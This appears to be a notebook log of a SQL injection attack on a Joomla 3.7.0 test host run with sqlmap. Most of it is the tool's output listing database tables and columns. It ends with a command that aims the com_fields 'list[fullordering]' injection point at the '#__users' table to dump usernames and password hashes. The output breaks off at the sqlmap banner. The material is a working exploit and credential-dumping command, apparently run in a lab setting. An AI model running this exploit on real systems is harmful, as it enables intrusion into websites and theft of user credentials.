# [13:53:23] [INFO] retrieved: 'id'
# [13:53:24] [INFO] retrieved: '#__assets'
# [13:53:24] [INFO] retrieved: 'id'
# [13:53:25] [INFO] retrieved: '#__assets'
# [13:53:25] [INFO] retrieved: 'id'
# [13:53:26] [INFO] retrieved: '#__assets'
# [13:53:26] [INFO] retrieved: 'id'
# [13:53:27] [INFO] retrieved: '#__assets'
# [13:53:27] [INFO] retrieved: 'id'
# [13:53:28] [INFO] retrieved: '#__assets'
# [13:53:29] [INFO] retrieved: 'id'
# [13:53:29] [INFO] retrieved: '#__assets'
# [13:53:30] [INFO] retrieved: 'title'
# [13:53:30] [INFO] retrieved: '#__assets'
# [13:53:31] [INFO] retrieved: 'title'
# [13:53:31] [INFO] retrieved: '#__assets'
# [13:53:32] [INFO] retrieved: 'id'
# [13:53:32] [INFO] retrieved: '#__associations'
# [13:53:33] [INFO] retrieved: 'context'
# [13:53:33] [INFO] retrieved: '#__associations'
# [13:53:34] [INFO] retrieved: 'id'
# [13:53:34] [INFO] retrieved: '#__associations'
# [13:53:35] [INFO] retrieved: 'id'
# [13:53:35] [INFO] retrieved: '#__banners'
# [13:53:36] [INFO] retrieved: 'id'
# [13:53:36] [INFO] retrieved: '#__banners'
# [13:53:37] [INFO] retrieved: 'cid'
# [13:53:37] [INFO] retrieved: '#__banners'
# [13:53:38] [INFO] retrieved: 'cid'
# [13:53:38] [INFO] retrieved: '#__banners'
# [13:53:39] [INFO] retrieved: 'cid'
# [13:53:40] [INFO] retrieved: '#__banners'
# [13:53:40] [INFO] retrieved: 'type'
# [13:53:41] [INFO] retrieved: '#__banners'
# [13:53:41] [INFO] retrieved: 'type'
# [13:53:42] [INFO] retrieved: '#__banners'
# [13:53:42] [INFO] retrieved: 'id'
# [13:53:43] [INFO] retrieved: '#__banners'
# [13:53:43] [INFO] retrieved: 'imptotal'
# [13:53:44] [INFO] retrieved: '#__banners'
# [13:53:44] [INFO] retrieved: 'state'
# [13:53:45] [INFO] retrieved: '#__banners'
# [13:53:46] [INFO] retrieved: 'state'
# [13:53:46] [INFO] retrieved: '#__banners'
# [13:53:47] [INFO] retrieved: 'catid'
# [13:53:47] [INFO] retrieved: '#__banners'
# [13:53:48] [INFO] retrieved: 'id'
# [13:53:48] [INFO] retrieved: '#__banners'
# [13:53:49] [INFO] retrieved: 'impmade'
# [13:53:49] [INFO] retrieved: '#__banners'
# [13:53:50] [INFO] retrieved: 'state'
# [13:53:50] [INFO] retrieved: '#__banners'
# [13:53:51] [INFO] retrieved: 'catid'
# [13:53:51] [INFO] retrieved: '#__banners'
# [13:53:52] [INFO] retrieved: 'name'
# [13:53:52] [INFO] retrieved: '#__banners'
# [13:53:53] [INFO] retrieved: 'state'
# [13:53:53] [INFO] retrieved: '#__banners'
# [13:53:54] [INFO] retrieved: 'clickurl'
# [13:53:54] [INFO] retrieved: '#__banners'
# [13:53:55] [INFO] retrieved: 'clickurl'
# [13:53:55] [INFO] retrieved: '#__banners'
# [13:53:56] [INFO] retrieved: 'cid'
# [13:53:56] [INFO] retrieved: '#__banners'
# [13:53:57] [INFO] retrieved: 'imptotal'
# [13:53:57] [INFO] retrieved: '#__banners'
# [13:53:58] [INFO] retrieved: 'cid'
# [13:53:58] [INFO] retrieved: '#__banners'
# [13:53:59] [INFO] retrieved: 'cid'
# [13:53:59] [INFO] retrieved: '#__banners'
# [13:54:00] [INFO] retrieved: 'cid'
# [13:54:00] [INFO] retrieved: '#__banners'
# [13:54:01] [INFO] retrieved: 'name'
# [13:54:02] [INFO] retrieved: '#__banners'
# [13:54:02] [INFO] retrieved: 'alias'
# [13:54:03] [INFO] retrieved: '#__banners'
# [13:54:03] [INFO] retrieved: 'clickurl'
# [13:54:04] [INFO] retrieved: '#__banners'
# [13:54:04] [INFO] retrieved: 'description'
# [13:54:05] [INFO] retrieved: '#__banners'
# [13:54:05] [INFO] retrieved: 'description'
# [13:54:06] [INFO] retrieved: '#__banners'
# [13:54:06] [INFO] retrieved: 'catid'
# [13:54:06] [INFO] retrieved: '#__banners'
# [13:54:07] [INFO] retrieved: 'clicks'
# [13:54:08] [INFO] retrieved: '#__banners'
# [13:54:08] [INFO] retrieved: 'language'
# [13:54:09] [INFO] retrieved: '#__banners'
# [13:54:09] [INFO] retrieved: 'track_impressions'
# [13:54:10] [INFO] retrieved: '#__banners'
# [13:54:10] [INFO] retrieved: 'id'
# [13:54:11] [INFO] retrieved: '#__banner_clients'
# [13:54:11] [INFO] retrieved: 'name'
# [13:54:12] [INFO] retrieved: '#__banner_clients'
# [13:54:12] [INFO] retrieved: 'contact'
# [13:54:13] [INFO] retrieved: '#__banner_clients'
# [13:54:13] [INFO] retrieved: 'contact'
# [13:54:14] [INFO] retrieved: '#__banner_clients'
# [13:54:14] [INFO] retrieved: 'checked_out_time'
# [13:54:15] [INFO] retrieved: '#__banner_clients'
# [13:54:15] [INFO] retrieved: 'checked_out_time'
# [13:54:16] [INFO] retrieved: '#__banner_clients'
# [13:54:17] [INFO] retrieved: 'state'
# [13:54:17] [INFO] retrieved: '#__banner_clients'
# [13:54:17] [INFO] retrieved: 'checked_out_time'
# [13:54:18] [INFO] retrieved: '#__banner_clients'
# [13:54:19] [INFO] retrieved: 'track_impressions'
# [13:54:19] [INFO] retrieved: '#__banner_clients'
# [13:54:20] [INFO] retrieved: 'contact'
# [13:54:20] [INFO] retrieved: '#__banner_clients'
# [13:54:20] [INFO] retrieved: 'track_impressions'
# [13:54:21] [INFO] retrieved: '#__banner_clients'
# [13:54:21] [INFO] retrieved: 'state'
# [13:54:22] [INFO] retrieved: '#__banner_clients'
# [13:54:22] [INFO] retrieved: 'purchase_type'
# [13:54:23] [INFO] retrieved: '#__banner_clients'
# [13:54:23] [INFO] retrieved: 'metakey_prefix'
# [13:54:24] [INFO] retrieved: '#__banner_clients'
# [13:54:24] [INFO] retrieved: 'count'
# [13:54:24] [INFO] retrieved: '#__banner_tracks'
# [13:54:25] [INFO] retrieved: 'count'
# [13:54:25] [INFO] retrieved: '#__banner_tracks'
# [13:54:26] [INFO] retrieved: 'banner_id'
# [13:54:26] [INFO] retrieved: '#__banner_tracks'
# [13:54:27] [INFO] retrieved: 'track_type'
# [13:54:27] [INFO] retrieved: '#__banner_tracks'
# [13:54:28] [INFO] retrieved: 'hits'
# [13:54:28] [INFO] retrieved: '#__categories'
# [13:54:29] [INFO] retrieved: 'language'
# [13:54:29] [INFO] retrieved: '#__categories'
# [13:54:30] [INFO] retrieved: 'modified_user_id'
# [13:54:30] [INFO] retrieved: '#__categories'
# [13:54:31] [INFO] retrieved: 'modified_time'
# [13:54:31] [INFO] retrieved: '#__categories'
# [13:54:32] [INFO] retrieved: 'modified_time'
# [13:54:32] [INFO] retrieved: '#__categories'
# [13:54:33] [INFO] retrieved: 'description'
# [13:54:33] [INFO] retrieved: '#__categories'
# [13:54:34] [INFO] retrieved: 'access'
# [13:54:34] [INFO] retrieved: '#__categories'
# [13:54:35] [INFO] retrieved: 'language'
# [13:54:35] [INFO] retrieved: '#__categories'
# [13:54:36] [INFO] retrieved: 'metadesc'
# [13:54:36] [INFO] retrieved: '#__categories'
# [13:54:37] [INFO] retrieved: 'id'
# [13:54:37] [INFO] retrieved: '#__categories'
# [13:54:38] [INFO] retrieved: 'id'
# [13:54:38] [INFO] retrieved: '#__categories'
# [13:54:39] [INFO] retrieved: 'params'
# [13:54:39] [INFO] retrieved: '#__categories'
# [13:54:39] [INFO] retrieved: 'parent_id'
# [13:54:40] [INFO] retrieved: '#__categories'
# [13:54:40] [INFO] retrieved: 'rgt'
# [13:54:41] [INFO] retrieved: '#__categories'
# [13:54:41] [INFO] retrieved: 'parent_id'
# [13:54:42] [INFO] retrieved: '#__categories'
# [13:54:42] [INFO] retrieved: 'asset_id'
# [13:54:43] [INFO] retrieved: '#__categories'
# [13:54:43] [INFO] retrieved: 'language'
# [13:54:44] [INFO] retrieved: '#__categories'
# [13:54:44] [INFO] retrieved: 'extension'
# [13:54:44] [INFO] retrieved: '#__categories'
# [13:54:45] [INFO] retrieved: 'description'
# [13:54:45] [INFO] retrieved: '#__categories'
# [13:54:46] [INFO] retrieved: 'id'
# [13:54:46] [INFO] retrieved: '#__categories'
# [13:54:47] [INFO] retrieved: 'checked_out'
# [13:54:47] [INFO] retrieved: '#__categories'
# [13:54:48] [INFO] retrieved: 'lft'
# [13:54:49] [INFO] retrieved: '#__categories'
# [13:54:49] [INFO] retrieved: 'created_time'
# [13:54:50] [INFO] retrieved: '#__categories'
# [13:54:50] [INFO] retrieved: 'access'
# [13:54:51] [INFO] retrieved: '#__categories'
# [13:54:51] [INFO] retrieved: 'params'
# [13:54:52] [INFO] retrieved: '#__categories'
# [13:54:52] [INFO] retrieved: 'metadata'
# [13:54:53] [INFO] retrieved: '#__categories'
# [13:54:53] [INFO] retrieved: 'metadata'
# [13:54:53] [INFO] retrieved: '#__categories'
# [13:54:54] [INFO] retrieved: 'created'
# [13:54:54] [INFO] retrieved: '#__contact_details'
# [13:54:55] [INFO] retrieved: 'created_by'
# [13:54:55] [INFO] retrieved: '#__contact_details'
# [13:54:56] [INFO] retrieved: 'created_by'
# [13:54:56] [INFO] retrieved: '#__contact_details'
# [13:54:57] [INFO] retrieved: 'modified'
# [13:54:57] [INFO] retrieved: '#__contact_details'
# [13:54:58] [INFO] retrieved: 'metadata'
# [13:54:58] [INFO] retrieved: '#__contact_details'
# [13:54:59] [INFO] retrieved: 'created_by'
# [13:54:59] [INFO] retrieved: '#__contact_details'
# [13:55:00] [INFO] retrieved: 'metadata'
# [13:55:00] [INFO] retrieved: '#__contact_details'
# [13:55:01] [INFO] retrieved: 'created'
# [13:55:01] [INFO] retrieved: '#__contact_details'
# [13:55:01] [INFO] retrieved: 'address'
# [13:55:02] [INFO] retrieved: '#__contact_details'
# [13:55:02] [INFO] retrieved: 'address'
# [13:55:03] [INFO] retrieved: '#__contact_details'
# [13:55:03] [INFO] retrieved: 'metadesc'
# [13:55:05] [INFO] retrieved: '#__contact_details'
# [13:55:05] [INFO] retrieved: 'publish_down'
# [13:55:06] [INFO] retrieved: '#__contact_details'
# [13:55:06] [INFO] retrieved: 'con_position'
# [13:55:07] [INFO] retrieved: '#__contact_details'
# [13:55:07] [INFO] retrieved: 'state'
# [13:55:08] [INFO] retrieved: '#__contact_details'
# [13:55:08] [INFO] retrieved: 'fax'
# [13:55:09] [INFO] retrieved: '#__contact_details'
# [13:55:09] [INFO] retrieved: 'postcode'
# [13:55:10] [INFO] retrieved: '#__contact_details'
# [13:55:10] [INFO] retrieved: 'postcode'
# [13:55:11] [INFO] retrieved: '#__contact_details'
# [13:55:11] [INFO] retrieved: 'suburb'
# [13:55:11] [INFO] retrieved: '#__contact_details'
# [13:55:12] [INFO] retrieved: 'checked_out'
# [13:55:12] [INFO] retrieved: '#__contact_details'
# [13:55:13] [INFO] retrieved: 'fax'
# [13:55:14] [INFO] retrieved: '#__contact_details'
# [13:55:14] [INFO] retrieved: 'id'
# [13:55:15] [INFO] retrieved: '#__contact_details'
# [13:55:15] [INFO] retrieved: 'country'
# [13:55:15] [INFO] retrieved: '#__contact_details'
# [13:55:16] [INFO] retrieved: 'address'
# [13:55:16] [INFO] retrieved: '#__contact_details'
# [13:55:17] [INFO] retrieved: 'checked_out'
# [13:55:17] [INFO] retrieved: '#__contact_details'
# [13:55:18] [INFO] retrieved: 'language'
# [13:55:18] [INFO] retrieved: '#__contact_details'
# [13:55:19] [INFO] retrieved: 'mobile'
# [13:55:19] [INFO] retrieved: '#__contact_details'
# [13:55:20] [INFO] retrieved: 'image'
# [13:55:21] [INFO] retrieved: '#__contact_details'
# [13:55:22] [INFO] retrieved: 'id'
# [13:55:23] [INFO] retrieved: '#__contact_details'
# [13:55:23] [INFO] retrieved: 'image'
# [13:55:24] [INFO] retrieved: '#__contact_details'
# [13:55:24] [INFO] retrieved: 'address'
# [13:55:25] [INFO] retrieved: '#__contact_details'
# [13:55:25] [INFO] retrieved: 'state'
# [13:55:26] [INFO] retrieved: '#__contact_details'
# [13:55:26] [INFO] retrieved: 'id'
# [13:55:27] [INFO] retrieved: '#__contact_details'
# [13:55:27] [INFO] retrieved: 'metadata'
# [13:55:28] [INFO] retrieved: '#__contact_details'
# [13:55:29] [INFO] retrieved: 'mobile'
# [13:55:29] [INFO] retrieved: '#__contact_details'
# [13:55:30] [INFO] retrieved: 'created'
# [13:55:30] [INFO] retrieved: '#__contact_details'
# [13:55:31] [INFO] retrieved: 'webpage'
# [13:55:32] [INFO] retrieved: '#__contact_details'
# [13:55:32] [INFO] retrieved: 'sortname3'
# [13:55:33] [INFO] retrieved: '#__contact_details'
# [13:55:34] [INFO] retrieved: 'sortname3'
# [13:55:34] [INFO] retrieved: '#__contact_details'
# [13:55:35] [INFO] retrieved: 'mobile'
# [13:55:35] [INFO] retrieved: '#__contact_details'
# [13:55:36] [INFO] retrieved: 'sortname1'
# [13:55:36] [INFO] retrieved: '#__contact_details'
# [13:55:37] [INFO] retrieved: 'alias'
# [13:55:37] [INFO] retrieved: '#__contact_details'
# [13:55:38] [INFO] retrieved: 'id'
# [13:55:38] [INFO] retrieved: '#__contact_details'
# [13:55:39] [INFO] retrieved: 'con_position'
# [13:55:40] [INFO] retrieved: '#__contact_details'
# [13:55:40] [INFO] retrieved: 'created_by_alias'
# [13:55:41] [INFO] retrieved: '#__content'
# [13:55:41] [INFO] retrieved: 'modified'
# [13:55:42] [INFO] retrieved: '#__content'
# [13:55:42] [INFO] retrieved: 'modified_by'
# [13:55:43] [INFO] retrieved: '#__content'
# [13:55:43] [INFO] retrieved: 'publish_down'
# [13:55:44] [INFO] retrieved: '#__content'
# [13:55:44] [INFO] retrieved: 'checked_out_time'
# [13:55:45] [INFO] retrieved: '#__content'
# [13:55:45] [INFO] retrieved: 'images'
# [13:55:46] [INFO] retrieved: '#__content'
# [13:55:46] [INFO] retrieved: 'attribs'
# [13:55:47] [INFO] retrieved: '#__content'
# [13:55:47] [INFO] retrieved: 'ordering'
# [13:55:48] [INFO] retrieved: '#__content'
# [13:55:48] [INFO] retrieved: 'id'
# [13:55:48] [INFO] retrieved: '#__content'
# [13:55:49] [INFO] retrieved: 'checked_out'
# [13:55:49] [INFO] retrieved: '#__content'
# [13:55:50] [INFO] retrieved: 'publish_up'
# [13:55:50] [INFO] retrieved: '#__content'
# [13:55:51] [INFO] retrieved: 'xreference'
# [13:55:51] [INFO] retrieved: '#__content'
# [13:55:52] [INFO] retrieved: 'images'
# [13:55:52] [INFO] retrieved: '#__content'
# [13:55:53] [INFO] retrieved: 'catid'
# [13:55:54] [INFO] retrieved: '#__content'
# [13:55:54] [INFO] retrieved: 'checked_out_time'
# [13:55:54] [INFO] retrieved: '#__content'
# [13:55:55] [INFO] retrieved: 'checked_out'
# [13:55:56] [INFO] retrieved: '#__content'
# [13:55:56] [INFO] retrieved: 'title'
# [13:55:57] [INFO] retrieved: '#__content'
# [13:55:57] [INFO] retrieved: 'version'
# [13:55:58] [INFO] retrieved: '#__content'
# [13:55:58] [INFO] retrieved: 'introtext'
# [13:55:59] [INFO] retrieved: '#__content'
# [13:55:59] [INFO] retrieved: 'alias'
# [13:55:59] [INFO] retrieved: '#__content'
# [13:56:00] [INFO] retrieved: 'state'
# [13:56:00] [INFO] retrieved: '#__content'
# [13:56:01] [INFO] retrieved: 'created'
# [13:56:02] [INFO] retrieved: '#__content'
# [13:56:02] [INFO] retrieved: 'publish_down'
# [13:56:03] [INFO] retrieved: '#__content'
# [13:56:03] [INFO] retrieved: 'created_by_alias'
# [13:56:04] [INFO] retrieved: '#__content'
# [13:56:04] [INFO] retrieved: 'catid'
# [13:56:05] [INFO] retrieved: '#__content'
# [13:56:05] [INFO] retrieved: 'alias'
# [13:56:06] [INFO] retrieved: '#__content'
# [13:56:07] [INFO] retrieved: 'version'
# [13:56:07] [INFO] retrieved: '#__content'
# [13:56:08] [INFO] retrieved: 'created_by'
# [13:56:09] [INFO] retrieved: '#__content'
# [13:56:10] [INFO] retrieved: 'hits'
# [13:56:10] [INFO] retrieved: '#__content'
# [13:56:11] [INFO] retrieved: 'fulltext'
# [13:56:11] [INFO] retrieved: '#__content'
# [13:56:12] [INFO] retrieved: 'type_id'
# [13:56:13] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:13] [INFO] retrieved: 'type_id'
# [13:56:14] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:14] [INFO] retrieved: 'content_item_id'
# [13:56:15] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:16] [INFO] retrieved: 'tag_id'
# [13:56:16] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:17] [INFO] retrieved: 'tag_id'
# [13:56:17] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:18] [INFO] retrieved: 'content_item_id'
# [13:56:18] [INFO] retrieved: '#__contentitem_tag_map'
# [13:56:18] [INFO] retrieved: 'ordering'
# [13:56:19] [INFO] retrieved: '#__content_frontpage'
# [13:56:19] [INFO] retrieved: 'ordering'
# [13:56:20] [INFO] retrieved: '#__content_frontpage'
# [13:56:20] [INFO] retrieved: 'content_id'
# [13:56:21] [INFO] retrieved: '#__content_rating'
# [13:56:21] [INFO] retrieved: 'content_id'
# [13:56:22] [INFO] retrieved: '#__content_rating'
# [13:56:22] [INFO] retrieved: 'rating_sum'
# [13:56:23] [INFO] retrieved: '#__content_rating'
# [13:56:23] [INFO] retrieved: 'content_id'
# [13:56:24] [INFO] retrieved: '#__content_rating'
# [13:56:24] [INFO] retrieved: 'field_mappings'
# [13:56:25] [INFO] retrieved: '#__content_types'
# [13:56:25] [INFO] retrieved: 'type_title'
# [13:56:26] [INFO] retrieved: '#__content_types'
# [13:56:26] [INFO] retrieved: 'table'
# [13:56:27] [INFO] retrieved: '#__content_types'
# [13:56:27] [INFO] retrieved: 'field_mappings'
# [13:56:28] [INFO] retrieved: '#__content_types'
# [13:56:28] [INFO] retrieved: 'content_history_options'
# [13:56:29] [INFO] retrieved: '#__content_types'
# [13:56:29] [INFO] retrieved: 'type_id'
# [13:56:30] [INFO] retrieved: '#__content_types'
# [13:56:31] [INFO] retrieved: 'router'
# [13:56:31] [INFO] retrieved: '#__content_types'
# [13:56:32] [INFO] retrieved: 'content_history_options'
# [13:56:32] [INFO] retrieved: '#__content_types'
# [13:56:33] [INFO] retrieved: 'search_term'
# [13:56:33] [INFO] retrieved: '#__core_log_searches'
# [13:56:34] [INFO] retrieved: 'search_term'
# [13:56:34] [INFO] retrieved: '#__core_log_searches'
# [13:56:35] [INFO] retrieved: 'extension_id'
# [13:56:36] [INFO] retrieved: '#__extensions'
# [13:56:36] [INFO] retrieved: 'extension_id'
# [13:56:37] [INFO] retrieved: '#__extensions'
# [13:56:37] [INFO] retrieved: 'name'
# [13:56:38] [INFO] retrieved: '#__extensions'
# [13:56:38] [INFO] retrieved: 'package_id'
# [13:56:39] [INFO] retrieved: '#__extensions'
# [13:56:39] [INFO] retrieved: 'name'
# [13:56:40] [INFO] retrieved: '#__extensions'
# [13:56:40] [INFO] retrieved: 'package_id'
# [13:56:41] [INFO] retrieved: '#__extensions'
# [13:56:41] [INFO] retrieved: 'name'
# [13:56:42] [INFO] retrieved: '#__extensions'
# [13:56:42] [INFO] retrieved: 'type'
# [13:56:43] [INFO] retrieved: '#__extensions'
# [13:56:44] [INFO] retrieved: 'extension_id'
# [13:56:44] [INFO] retrieved: '#__extensions'
# [13:56:45] [INFO] retrieved: 'package_id'
# [13:56:45] [INFO] retrieved: '#__extensions'
# [13:56:46] [INFO] retrieved: 'enabled'
# [13:56:47] [INFO] retrieved: '#__extensions'
# [13:56:47] [INFO] retrieved: 'package_id'
# [13:56:48] [INFO] retrieved: '#__extensions'
# [13:56:49] [INFO] retrieved: 'custom_data'
# [13:56:50] [INFO] retrieved: '#__extensions'
# [13:56:50] [INFO] retrieved: 'client_id'
# [13:56:51] [INFO] retrieved: '#__extensions'
# [13:56:51] [INFO] retrieved: 'system_data'
# [13:56:52] [INFO] retrieved: '#__extensions'
# [13:56:53] [INFO] retrieved: 'checked_out_time'
# [13:56:53] [INFO] retrieved: '#__extensions'
# [13:56:54] [INFO] retrieved: 'system_data'
# [13:56:55] [INFO] retrieved: '#__extensions'
# [13:56:55] [INFO] retrieved: 'custom_data'
# [13:56:56] [INFO] retrieved: '#__extensions'
# [13:56:57] [INFO] retrieved: 'modified_by'
# [13:56:57] [INFO] retrieved: '#__fields'
# [13:56:58] [INFO] retrieved: 'access'
# [13:56:59] [INFO] retrieved: '#__fields'
# [13:56:59] [INFO] retrieved: 'created_time'
# [13:57:00] [INFO] retrieved: '#__fields'
# [13:57:00] [INFO] retrieved: 'modified_time'
# [13:57:01] [INFO] retrieved: '#__fields'
# [13:57:02] [INFO] retrieved: 'default_value'
# [13:57:02] [INFO] retrieved: '#__fields'
# [13:57:03] [INFO] retrieved: 'checked_out'
# [13:57:03] [INFO] retrieved: '#__fields'
# [13:57:04] [INFO] retrieved: 'description'
# [13:57:05] [INFO] retrieved: '#__fields'
# 15

# %%
os.system('cat /home/jovyan/.sqlmap/output/joomla370/dump/information_schema/COLUMNS.csv | grep "#__users"')
# Out:
# >8
# cat: /home/jovyan/.sqlmap/output/joomla370/dump/information_schema/COLUMNS.csv: No such file or directory
# 256

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" -C username,password --dump')
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [']_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:57:07 /2022-04-20/
#
# >?47h8
